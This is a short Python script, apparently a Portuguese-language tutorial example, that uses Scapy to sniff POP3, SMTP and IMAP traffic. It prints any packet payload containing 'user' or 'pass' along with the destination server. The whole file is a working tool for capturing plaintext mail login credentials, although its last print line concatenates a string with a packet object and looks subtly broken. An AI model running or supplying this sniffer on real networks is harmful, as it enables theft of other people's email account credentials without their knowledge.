from scapy.all import *
def pacote_callback(pacote):
    if pacote[TCP].payload:
        pacote_mail = str(pacote[TCP].payload)
        if "user" in pacote_mail.lower() or "pass" in pacote_mail.lower():
            print "[*] Servidor: " + pacote[IP].dst
            print "[*] " + pacote[TCP].payload
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", \
      prn= pacote_callback, store=0)
